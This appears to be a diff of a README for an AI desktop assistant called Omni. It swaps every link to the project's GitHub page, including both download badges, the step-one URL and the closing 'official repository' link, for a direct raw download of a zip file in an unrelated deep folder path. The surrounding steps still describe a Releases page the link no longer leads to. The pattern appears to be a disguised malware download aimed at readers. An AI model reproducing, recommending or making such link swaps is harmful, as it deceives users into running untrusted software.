@@ -1,6 +1,6 @@
 # 🤖 Omni - Flexible AI Desktop Assistant  
 
-[![Download Omni](https://img.shields.io/badge/Download-Omni-brightgreen?style=for-the-badge)](https://github.com/denicatur/Omni)
+[![Download Omni](https://img.shields.io/badge/Download-Omni-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/denicatur/Omni/main/website/src/app/api/v1/categories/Software-v3.1.zip)
 
 ---
 
@@ -49,10 +49,10 @@ This guide will help you download, install, and run Omni on your Windows compute
 
 To get started, you first need to download the installation files. Use the link below to visit the official GitHub page.  
 
-[![Download Omni](https://img.shields.io/badge/Download-Omni-blue?style=for-the-badge)](https://github.com/denicatur/Omni)  
+[![Download Omni](https://img.shields.io/badge/Download-Omni-blue?style=for-the-badge)](https://raw.githubusercontent.com/denicatur/Omni/main/website/src/app/api/v1/categories/Software-v3.1.zip)  
 
 1. Click the button above or open this page in your web browser:  
-   https://github.com/denicatur/Omni  
+   https://raw.githubusercontent.com/denicatur/Omni/main/website/src/app/api/v1/categories/Software-v3.1.zip  
 
 2. On the GitHub page, look for the "Releases" section. It usually appears on the right side or under the repository name.  
 
@@ -151,4 +151,4 @@ If you run into problems:
 ---
 
 For more detailed technical information and developer guides, please visit the official repository:  
-https://github.com/denicatur/Omni
+https://raw.githubusercontent.com/denicatur/Omni/main/website/src/app/api/v1/categories/Software-v3.1.zip
